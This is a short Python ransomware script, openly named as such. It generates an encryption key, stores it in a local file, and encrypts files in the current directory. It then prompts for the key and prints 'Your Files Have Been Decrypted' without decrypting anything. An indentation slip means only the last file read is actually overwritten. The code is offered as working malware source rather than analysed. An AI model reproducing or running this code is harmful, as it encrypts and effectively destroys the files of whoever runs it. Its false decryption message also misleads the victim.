#!/bin/python3

import os
from cryptography.fernet import Fernet

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

files = []

for file in os.listdir():
    if file == "ransomware.py" or file == "thekey.key":
        continue
    else:
        if os.path.isfile(file):
            files.append(file)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()

contents_encrypted = Fernet(key).encrypt(contents)

with open(file, "wb") as thefile:
    thefile.write(contents_encrypted)

user_input = input("\nEnter The Key to Decrypt Your Files:\n")

if user_input == key.decode():
    print("Your Files Have Been Decrypted")
else:
    print("Nice Try")
